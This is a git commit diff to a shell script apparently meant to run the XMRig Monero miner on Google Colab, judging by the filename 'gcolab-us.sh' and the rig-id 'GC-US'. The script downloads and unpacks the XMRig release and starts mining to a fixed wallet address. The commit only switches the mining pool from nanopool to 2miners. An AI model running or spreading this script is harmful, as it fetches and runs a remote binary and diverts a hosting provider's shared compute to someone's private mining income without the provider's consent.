5080e49ec577c18e72419145c1f803c6b991395f
JohnOnGit <fraga_jonathan@protonmail.ch>
2022-09-21 09:25:22 +0200

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o xmr-us-east1.nanopool.org:14433 -u 8B53b65YSMSjSLKyNZ9kV6VR22yiNPmW2EsuSDLSZn4RDqb6AA9a9KTh4NRc1TMEwjHmrbjB3VWGTi5d6oSp9rQFLBD29gu -k --tls --rig-id GC-US --coin monero
+./xmrig -o xxmr.2miners.com:12222 -u 8B53b65YSMSjSLKyNZ9kV6VR22yiNPmW2EsuSDLSZn4RDqb6AA9a9KTh4NRc1TMEwjHmrbjB3VWGTi5d6oSp9rQFLBD29gu -k --tls --rig-id GC-US --coin monero
